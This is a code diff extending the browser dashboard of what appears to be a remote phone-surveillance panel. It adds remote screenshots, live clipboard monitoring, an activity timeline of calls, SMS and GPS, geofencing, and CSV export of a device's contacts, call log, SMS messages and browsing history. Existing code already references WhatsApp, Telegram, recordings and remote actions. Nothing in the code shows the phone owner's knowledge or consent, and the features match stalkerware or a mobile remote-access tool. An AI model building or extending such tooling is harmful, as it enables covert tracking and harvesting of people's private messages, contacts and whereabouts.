@@ -108,7 +108,8 @@ function updateDashboard() {
         '<span>🔋 ' + battText + '</span>' +
         '<span>📡 ' + netText + '</span>' +
         '<span>' + (device.online ? '🟢 Online' : '⚫ Offline') + '</span>' +
-      '</div>';
+      '</div>' +
+      '<button class="btn btn-outline" style="margin-top:8px;font-size:11px;padding:4px 10px" onclick="event.stopPropagation();renameDevice(\'' + device.id + '\')">✏️ Rename</button>';
     grid.appendChild(card);
   });
 }
@@ -127,7 +128,9 @@ function updateDeviceSelects() {
                  'recordingsDeviceSelect', 'whatsappDeviceSelect',
                  'infoDeviceSelect', 'emergencyDeviceSelect',
                  'remoteActionsDeviceSelect', 'appsDeviceSelect', 'simDeviceSelect',
-                 'telegramDeviceSelect'];
+                 'telegramDeviceSelect',
+                 'screenshotDeviceSelect', 'geofenceDeviceSelect', 'batteryAlertDeviceSelect',
+                 'timelineDeviceSelect', 'clipmonitorDeviceSelect', 'speedtestDeviceSelect'];
 
   selects.forEach(function(selId) {
     var sel = document.getElementById(selId);
@@ -1824,8 +1827,489 @@ socket.on('disconnect', function() {
   showToast('Disconnected from server', 'error');
 });
 
+// ============ SCREENSHOT ============
+var screenshotHistory = [];
+var lastScreenshot = null;
+
+function takeScreenshot() {
+  var deviceId = document.getElementById('screenshotDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:screenshot', { deviceId: deviceId });
+  showToast('Taking screenshot...', 'info');
+}
+
+function downloadScreenshot() {
+  if (!lastScreenshot) { showToast('No screenshot to download', 'error'); return; }
+  var a = document.createElement('a');
+  a.href = lastScreenshot;
+  a.download = 'screenshot_' + Date.now() + '.png';
+  a.click();
+}
+
+socket.on('screenshot:data', function(data) {
+  if (data.image) {
+    lastScreenshot = data.image;
+    screenshotHistory.unshift({ image: data.image, time: Date.now() });
+    if (screenshotHistory.length > 20) screenshotHistory = screenshotHistory.slice(0, 20);
+
+    var container = document.getElementById('screenshotContainer');
+    container.innerHTML = '<img src="' + data.image + '" style="max-width:100%;max-height:500px;border-radius:8px;cursor:pointer" onclick="openLightbox(\'' + data.image.substring(0, 50) + '\')">';
+    container.querySelector('img').onclick = function() { openLightbox(data.image); };
+
+    updateScreenshotHistory();
+    showToast('Screenshot captured!', 'success');
+  } else {
+    showToast('Screenshot failed: ' + (data.error || 'Unknown error'), 'error');
+  }
+});
+
+function updateScreenshotHistory() {
+  var el = document.getElementById('screenshotHistory');
+  if (screenshotHistory.length === 0) {
+    el.innerHTML = '<div class="empty-state" style="padding:20px"><p>No screenshots yet</p></div>';
+    return;
+  }
+  el.innerHTML = '';
+  screenshotHistory.forEach(function(ss) {
+    var div = document.createElement('div');
+    div.className = 'captured-photo';
+    div.onclick = function() { openLightbox(ss.image); };
+    div.innerHTML = '<img src="' + ss.image + '" alt="Screenshot">';
+    el.appendChild(div);
+  });
+}
+
+// ============ GEOFENCE ============
+var geofenceAlerts = [];
+
+function useCurrentLocationForGeofence() {
+  var lat = document.getElementById('gpsLat').textContent;
+  var lng = document.getElementById('gpsLng').textContent;
+  if (lat && lat !== '--' && lng && lng !== '--') {
+    document.getElementById('geofenceLat').value = lat;
+    document.getElementById('geofenceLng').value = lng;
+    showToast('Coordinates set from GPS', 'success');
+  } else {
+    showToast('Start GPS tracking first to get current location', 'error');
+  }
+}
+
+function setGeofence() {
+  var deviceId = document.getElementById('geofenceDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var lat = parseFloat(document.getElementById('geofenceLat').value);
+  var lng = parseFloat(document.getElementById('geofenceLng').value);
+  var radius = parseInt(document.getElementById('geofenceRadius').value);
+  var name = document.getElementById('geofenceName').value.trim() || 'Unnamed Zone';
+  if (isNaN(lat) || isNaN(lng)) { showToast('Enter valid coordinates', 'error'); return; }
+  socket.emit('command:geofence:set', { deviceId: deviceId, lat: lat, lng: lng, radius: radius, name: name });
+  document.getElementById('geofenceStatus').innerHTML =
+    '<div style="text-align:left">' +
+    '<div style="display:flex;align-items:center;gap:8px;margin-bottom:12px"><span style="font-size:24px">🛑</span><span style="color:var(--success);font-weight:600">Geofence Active</span></div>' +
+    '<div style="font-size:13px;color:var(--text-secondary)">' +
+    '<p><strong>Zone:</strong> ' + escapeHtml(name) + '</p>' +
+    '<p><strong>Center:</strong> ' + lat.toFixed(6) + ', ' + lng.toFixed(6) + '</p>' +
+    '<p><strong>Radius:</strong> ' + radius + 'm</p></div></div>';
+  showToast('Geofence set: ' + name, 'success');
+}
+
+function clearGeofence() {
+  var deviceId = document.getElementById('geofenceDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:geofence:clear', { deviceId: deviceId });
+  document.getElementById('geofenceStatus').innerHTML = '<p>No geofence set</p>';
+  showToast('Geofence cleared', 'info');
+}
+
+socket.on('geofence:alert', function(data) {
+  var icon = data.type === 'exit' ? '🚨' : '📍';
+  var msg = icon + ' Geofence ' + (data.type === 'exit' ? 'EXIT' : 'ENTER') + ': ' + (data.name || 'Zone');
+  showToast(msg, data.type === 'exit' ? 'error' : 'success');
+
+  geofenceAlerts.unshift({
+    type: data.type,
+    name: data.name,
+    distance: data.distance,
+    timestamp: Date.now()
+  });
+  if (geofenceAlerts.length > 50) geofenceAlerts = geofenceAlerts.slice(0, 50);
+  updateGeofenceAlerts();
+});
+
+socket.on('geofence:status', function(data) {
+  if (data.active) {
+    showToast('Geofence monitoring started', 'success');
+  }
+});
+
+function updateGeofenceAlerts() {
+  var list = document.getElementById('geofenceAlertList');
+  if (geofenceAlerts.length === 0) {
+    list.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted);font-size:13px">No alerts yet</div>';
+    return;
+  }
+  list.innerHTML = '';
+  geofenceAlerts.forEach(function(alert) {
+    var item = document.createElement('div');
+    item.className = 'log-item';
+    var icon = alert.type === 'exit' ? '🚨' : '📍';
+    item.innerHTML = '<div class="log-icon">' + icon + '</div>' +
+      '<div class="log-info"><div class="log-title">' + (alert.type === 'exit' ? 'EXIT' : 'ENTER') + ' - ' + escapeHtml(alert.name || 'Zone') + '</div>' +
+      '<div class="log-meta">' + new Date(alert.timestamp).toLocaleString() + ' | Distance: ' + Math.round(alert.distance) + 'm</div></div>';
+    list.appendChild(item);
+  });
+}
+
+// ============ BATTERY ALERTS ============
+var batteryAlerts = [];
+
+function setBatteryAlert() {
+  var deviceId = document.getElementById('batteryAlertDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var threshold = parseInt(document.getElementById('batteryThreshold').value);
+  socket.emit('command:batteryalert:set', { deviceId: deviceId, threshold: threshold });
+  showToast('Battery alert set at ' + threshold + '%', 'success');
+}
+
+function clearBatteryAlert() {
+  var deviceId = document.getElementById('batteryAlertDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:batteryalert:clear', { deviceId: deviceId });
+  showToast('Battery alert cleared', 'info');
+}
+
+socket.on('battery:alert', function(data) {
+  showToast('Battery Alert! Level: ' + data.level + '%', 'error');
+  batteryAlerts.unshift({
+    level: data.level,
+    charging: data.charging,
+    threshold: data.threshold,
+    timestamp: Date.now()
+  });
+  if (batteryAlerts.length > 50) batteryAlerts = batteryAlerts.slice(0, 50);
+  updateBatteryAlertList();
+});
+
+function updateBatteryAlertList() {
+  var list = document.getElementById('batteryAlertList');
+  if (batteryAlerts.length === 0) {
+    list.innerHTML = '<div class="empty-state" style="padding:40px"><div class="icon">⚡</div><h3>No Battery Alerts</h3></div>';
+    return;
+  }
+  list.innerHTML = '';
+  batteryAlerts.forEach(function(alert) {
+    var item = document.createElement('div');
+    item.className = 'log-item';
+    item.innerHTML = '<div class="log-icon">🔋</div>' +
+      '<div class="log-info"><div class="log-title">Battery at ' + alert.level + '% (Threshold: ' + alert.threshold + '%)</div>' +
+      '<div class="log-meta">' + new Date(alert.timestamp).toLocaleString() + ' | Charging: ' + (alert.charging ? 'Yes' : 'No') + '</div></div>';
+    list.appendChild(item);
+  });
+}
+
+// ============ ACTIVITY TIMELINE ============
+var timelineData = [];
+var filteredTimeline = [];
+
+function fetchTimeline() {
+  var deviceId = document.getElementById('timelineDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:timeline:fetch', { deviceId: deviceId });
+  showToast('Fetching timeline...', 'info');
+}
+
+function clearTimeline() {
+  timelineData = [];
+  filteredTimeline = [];
+  updateTimelineUI();
+}
+
+socket.on('timeline:data', function(data) {
+  if (data.events && data.events.length > 0) {
+    timelineData = data.events;
+    filterTimeline();
+    showToast(timelineData.length + ' events loaded', 'success');
+  } else {
+    timelineData = [];
+    updateTimelineUI();
+    showToast('No activity data found', 'info');
+  }
+});
+
+function filterTimeline() {
+  var filter = document.getElementById('timelineFilter').value;
+  if (filter === 'all') {
+    filteredTimeline = timelineData;
+  } else {
+    filteredTimeline = timelineData.filter(function(e) { return e.type === filter; });
+  }
+  document.getElementById('timelineCount').textContent = filteredTimeline.length + ' events';
+  updateTimelineUI();
+}
+
+function updateTimelineUI() {
+  var container = document.getElementById('timelineContainer');
+  if (filteredTimeline.length === 0) {
+    container.innerHTML = '<div class="empty-state" style="padding:60px 20px"><div class="icon">📊</div><h3>No Activity</h3></div>';
+    return;
+  }
+  container.innerHTML = '';
+  filteredTimeline.forEach(function(event) {
+    var icons = { call: '📞', sms: '💬', gps: '📍', camera: '📷', battery: '🔋', app: '💻', clipboard: '📋', notification: '🔔', geofence: '🛑', file: '📁' };
+    var icon = icons[event.type] || '📝';
+    var item = document.createElement('div');
+    item.className = 'timeline-item';
+    item.innerHTML =
+      '<div class="timeline-dot" style="background:var(--accent)"></div>' +
+      '<div class="timeline-content">' +
+        '<div class="timeline-header">' +
+          '<span class="timeline-icon">' + icon + '</span>' +
+          '<span class="timeline-title">' + escapeHtml(event.title || event.type) + '</span>' +
+          '<span class="timeline-time">' + (event.timestamp ? new Date(event.timestamp).toLocaleString() : '') + '</span>' +
+        '</div>' +
+        (event.detail ? '<div class="timeline-detail">' + escapeHtml(event.detail) + '</div>' : '') +
+      '</div>';
+    container.appendChild(item);
+  });
+}
+
+// ============ CLIPBOARD MONITOR ============
+var clipMonitorActive = false;
+var clipboardHistory = [];
+
+function toggleClipMonitor() {
+  var deviceId = document.getElementById('clipmonitorDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+
+  clipMonitorActive = !clipMonitorActive;
+  if (clipMonitorActive) {
+    socket.emit('command:clipmonitor:start', { deviceId: deviceId });
+    document.getElementById('btnClipMonitor').innerHTML = '<span>⏹</span> Stop Monitoring';
+    document.getElementById('clipMonitorStatus').textContent = 'Monitoring active...';
+    document.getElementById('clipMonitorStatus').style.color = 'var(--success)';
+  } else {
+    socket.emit('command:clipmonitor:stop', { deviceId: deviceId });
+    document.getElementById('btnClipMonitor').innerHTML = '<span>📋</span> Start Monitoring';
+    document.getElementById('clipMonitorStatus').textContent = 'Not active';
+    document.getElementById('clipMonitorStatus').style.color = 'var(--text-muted)';
+  }
+}
+
+socket.on('clipboard:change', function(data) {
+  clipboardHistory.unshift({
+    text: data.text,
+    timestamp: Date.now()
+  });
+  if (clipboardHistory.length > 100) clipboardHistory = clipboardHistory.slice(0, 100);
+  updateClipboardHistory();
+  showToast('Clipboard changed!', 'info');
+});
+
+function updateClipboardHistory() {
+  var list = document.getElementById('clipboardHistory');
+  if (clipboardHistory.length === 0) {
+    list.innerHTML = '<div class="empty-state" style="padding:60px 20px"><div class="icon">📋</div><h3>No Clipboard Data</h3></div>';
+    return;
+  }
+  list.innerHTML = '';
+  clipboardHistory.forEach(function(item) {
+    var el = document.createElement('div');
+    el.className = 'log-item';
+    el.innerHTML = '<div class="log-icon">📋</div>' +
+      '<div class="log-info"><div class="log-title" style="white-space:pre-wrap;word-break:break-all">' + escapeHtml(item.text || '(empty)') + '</div>' +
+      '<div class="log-meta">' + new Date(item.timestamp).toLocaleString() + '</div></div>';
+    list.appendChild(el);
+  });
+}
+
+// ============ NETWORK SPEED TEST ============
+var speedTestHistoryData = [];
+
+function runSpeedTest() {
+  var deviceId = document.getElementById('speedtestDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  document.getElementById('btnSpeedTest').disabled = true;
+  document.getElementById('btnSpeedTest').innerHTML = '<span>⏳</span> Testing...';
+  document.getElementById('speedDownload').textContent = '...';
+  document.getElementById('speedUpload').textContent = '...';
+  document.getElementById('speedLatency').textContent = '...';
+  socket.emit('command:speedtest', { deviceId: deviceId });
+  showToast('Running speed test...', 'info');
+}
+
+socket.on('speedtest:result', function(data) {
+  document.getElementById('btnSpeedTest').disabled = false;
+  document.getElementById('btnSpeedTest').innerHTML = '<span>🚀</span> Run Speed Test';
+
+  if (data.error) {
+    showToast('Speed test failed: ' + data.error, 'error');
+    return;
+  }
+
+  document.getElementById('speedDownload').textContent = data.download ? data.download.toFixed(1) : '--';
+  document.getElementById('speedUpload').textContent = data.upload ? data.upload.toFixed(1) : '--';
+  document.getElementById('speedLatency').textContent = data.latency ? Math.round(data.latency) : '--';
+
+  speedTestHistoryData.unshift({
+    download: data.download,
+    upload: data.upload,
+    latency: data.latency,
+    timestamp: Date.now()
+  });
+  if (speedTestHistoryData.length > 20) speedTestHistoryData = speedTestHistoryData.slice(0, 20);
+  updateSpeedTestHistory();
+  showToast('Speed test complete!', 'success');
+});
+
+function updateSpeedTestHistory() {
+  var list = document.getElementById('speedTestHistory');
+  if (speedTestHistoryData.length === 0) {
+    list.innerHTML = '<div class="empty-state" style="padding:30px"><p>No speed tests run yet</p></div>';
+    return;
+  }
+  list.innerHTML = '';
+  speedTestHistoryData.forEach(function(item) {
+    var el = document.createElement('div');
+    el.className = 'log-item';
+    el.innerHTML = '<div class="log-icon">🚀</div>' +
+      '<div class="log-info"><div class="log-title">⬇ ' + (item.download ? item.download.toFixed(1) : '--') + ' Mbps | ⬆ ' + (item.upload ? item.upload.toFixed(1) : '--') + ' Mbps | ⏱ ' + (item.latency ? Math.round(item.latency) : '--') + 'ms</div>' +
+      '<div class="log-meta">' + new Date(item.timestamp).toLocaleString() + '</div></div>';
+    list.appendChild(el);
+  });
+}
+
+// ============ DEVICE RENAME ============
+function renameDevice(deviceId) {
+  var device = devices.find(function(d) { return d.id === deviceId; });
+  var newName = prompt('Enter new name for device:', device ? device.name : '');
+  if (newName && newName.trim()) {
+    socket.emit('command:device:rename', { deviceId: deviceId, newName: newName.trim() });
+    showToast('Renaming device...', 'info');
+  }
+}
+
+socket.on('device:renamed', function(data) {
+  if (data.success) {
+    showToast('Device renamed to: ' + data.newName, 'success');
+    fetchDevices();
+  }
+});
+
+// ============ EXPORT DATA (CSV) ============
+function exportCSV(type) {
+  var csv = '';
+  var filename = '';
+
+  if (type === 'contacts') {
+    if (!contactsData || contactsData.length === 0) { showToast('No contacts data. Fetch contacts first.', 'error'); return; }
+    csv = 'Name,Number\n';
+    contactsData.forEach(function(c) {
+      csv += '"' + (c.name || '').replace(/"/g, '""') + '","' + (c.number || '').replace(/"/g, '""') + '"\n';
+    });
+    filename = 'contacts_' + Date.now() + '.csv';
+  } else if (type === 'calllog') {
+    if (!callLogData || callLogData.length === 0) { showToast('No call log data. Fetch call log first.', 'error'); return; }
+    csv = 'Number,Name,Type,Duration,Timestamp\n';
+    callLogData.forEach(function(c) {
+      csv += '"' + (c.number || '') + '","' + (c.name || '') + '","' + (c.type || '') + '","' + (c.duration || '') + '","' + (c.timestamp ? new Date(c.timestamp).toLocaleString() : '') + '"\n';
+    });
+    filename = 'calllog_' + Date.now() + '.csv';
+  } else if (type === 'sms') {
+    if (!smsData || smsData.length === 0) { showToast('No SMS data. Fetch SMS first.', 'error'); return; }
+    csv = 'From,Body,Timestamp,Read\n';
+    smsData.forEach(function(s) {
+      csv += '"' + (s.from || '').replace(/"/g, '""') + '","' + (s.body || '').replace(/"/g, '""') + '","' + (s.timestamp ? new Date(s.timestamp).toLocaleString() : '') + '","' + (s.read ? 'Yes' : 'No') + '"\n';
+    });
+    filename = 'sms_' + Date.now() + '.csv';
+  } else if (type === 'apps') {
+    if (!allApps || allApps.length === 0) { showToast('No apps data. Fetch apps first.', 'error'); return; }
+    csv = 'Name,Package,Version,Type\n';
+    allApps.forEach(function(a) {
+      csv += '"' + (a.name || '').replace(/"/g, '""') + '","' + (a['package'] || '') + '","' + (a.version || '') + '","' + (a.system ? 'System' : 'User') + '"\n';
+    });
+    filename = 'apps_' + Date.now() + '.csv';
+  } else if (type === 'history') {
+    if (!historyData || historyData.length === 0) { showToast('No history data. Fetch history first.', 'error'); return; }
+    csv = 'URL,Title,Type,Timestamp\n';
+    historyData.forEach(function(h) {
+      csv += '"' + (h.url || '').replace(/"/g, '""') + '","' + (h.title || '').replace(/"/g, '""') + '","' + (h.type || '') + '","' + (h.timestamp ? new Date(h.timestamp).toLocaleString() : '') + '"\n';
+    });
+    filename = 'history_' + Date.now() + '.csv';
+  } else if (type === 'timeline') {
+    if (!timelineData || timelineData.length === 0) { showToast('No timeline data. Fetch timeline first.', 'error'); return; }
+    csv = 'Type,Title,Detail,Timestamp\n';
+    timelineData.forEach(function(e) {
+      csv += '"' + (e.type || '') + '","' + (e.title || '').replace(/"/g, '""') + '","' + (e.detail || '').replace(/"/g, '""') + '","' + (e.timestamp ? new Date(e.timestamp).toLocaleString() : '') + '"\n';
+    });
+    filename = 'timeline_' + Date.now() + '.csv';
+  }
+
+  if (!csv) { showToast('No data to export', 'error'); return; }
+
+  var blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+  var url = URL.createObjectURL(blob);
+  var a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  a.click();
+  URL.revokeObjectURL(url);
+  showToast('Exported ' + filename, 'success');
+}
+
+// ============ THEME TOGGLE ============
+var currentTheme = localStorage.getItem('mydevice_theme') || 'dark';
+
+function toggleTheme() {
+  currentTheme = currentTheme === 'dark' ? 'light' : 'dark';
+  localStorage.setItem('mydevice_theme', currentTheme);
+  applyTheme();
+}
+
+function applyTheme() {
+  var root = document.documentElement;
+  var icon = document.getElementById('themeIcon');
+  var label = document.getElementById('themeLabel');
+
+  if (currentTheme === 'light') {
+    root.style.setProperty('--bg-primary', '#f0f2f5');
+    root.style.setProperty('--bg-secondary', '#ffffff');
+    root.style.setProperty('--bg-card', '#ffffff');
+    root.style.setProperty('--bg-card-hover', '#f8f9fa');
+    root.style.setProperty('--text-primary', '#1a1a2e');
+    root.style.setProperty('--text-secondary', '#4a5568');
+    root.style.setProperty('--text-muted', '#718096');
+    root.style.setProperty('--border', 'rgba(0, 0, 0, 0.1)');
+    root.style.setProperty('--shadow', '0 4px 24px rgba(0, 0, 0, 0.08)');
+    if (icon) icon.textContent = '☀️';
+    if (label) label.textContent = 'Light Mode';
+  } else {
+    root.style.setProperty('--bg-primary', '#0a0e17');
+    root.style.setProperty('--bg-secondary', '#111827');
+    root.style.setProperty('--bg-card', '#1a2235');
+    root.style.setProperty('--bg-card-hover', '#1f2a40');
+    root.style.setProperty('--text-primary', '#f0f4ff');
+    root.style.setProperty('--text-secondary', '#94a3b8');
+    root.style.setProperty('--text-muted', '#64748b');
+    root.style.setProperty('--border', 'rgba(255, 255, 255, 0.06)');
+    root.style.setProperty('--shadow', '0 4px 24px rgba(0, 0, 0, 0.3)');
+    if (icon) icon.textContent = '🌙';
+    if (label) label.textContent = 'Dark Mode';
+  }
+}
+
+// ---- Socket Events ----
+socket.on('devices:updated', fetchDevices);
+socket.on('connect', function() {
+  showToast('Connected to server', 'success');
+  fetchDevices();
+});
+socket.on('disconnect', function() {
+  showToast('Disconnected from server', 'error');
+});
+
 // ---- Init ----
 document.addEventListener('DOMContentLoaded', function() {
   fetchDevices();
   setupAgentUrl();
+  applyTheme();
 });
